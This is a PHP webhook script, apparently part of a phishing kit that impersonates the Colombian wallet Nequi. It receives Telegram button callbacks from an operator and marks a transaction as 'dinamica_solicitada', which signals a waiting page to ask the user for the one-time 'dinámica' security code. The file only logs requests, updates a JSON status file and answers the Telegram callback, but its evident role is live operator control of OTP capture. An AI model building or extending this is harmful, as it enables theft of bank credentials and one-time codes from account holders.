<?php
// webhook.php - Maneja callbacks de Telegram para Nequi

// Cargar configuración
$config = require __DIR__ . '/config.php';

$log_file = __DIR__ . '/webhook.log';
$update = json_decode(file_get_contents('php://input'), true);
file_put_contents($log_file, date('Y-m-d H:i:s') . " - Received: " . json_encode($update) . "\n", FILE_APPEND);

if (isset($update['callback_query'])) {
    $cb = $update['callback_query'];
    $data = $cb['data'] ?? '';

    file_put_contents($log_file, date('Y-m-d H:i:s') . " - Callback data: $data\n", FILE_APPEND);

    // Manejar callback de solicitar dinámica
    if (strpos($data, 'solicitar_dinamica_') === 0) {
        $transactionId = str_replace('solicitar_dinamica_', '', $data);
        file_put_contents($log_file, date('Y-m-d H:i:s') . " - Procesando dinamica para transactionId: $transactionId\n", FILE_APPEND);

        // Actualizar status de dinámica
        $DINAMICA_STATUS_FILE = __DIR__ . '/dinamica_status.json';
        $data_status = file_exists($DINAMICA_STATUS_FILE) ? json_decode(file_get_contents($DINAMICA_STATUS_FILE), true) : [];
        $data_status[$transactionId] = ['status' => 'dinamica_solicitada', 'message_id' => null, 'timestamp' => time()];
        file_put_contents($DINAMICA_STATUS_FILE, json_encode($data_status));

        file_put_contents($log_file, date('Y-m-d H:i:s') . " - Status actualizado a dinamica_solicitada para $transactionId\n", FILE_APPEND);

        // Responder al callback
        $answer = [
            'callback_query_id' => $cb['id'],
            'text' => 'Dinámica solicitada al usuario',
            'show_alert' => false
        ];

        $ch = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/answerCallbackQuery");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($answer),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json']
        ]);
        curl_exec($ch);
        curl_close($ch);

        file_put_contents($log_file, date('Y-m-d H:i:s') . " - Callback respondido\n", FILE_APPEND);
    }
}

http_response_code(200);
echo "OK";
?>



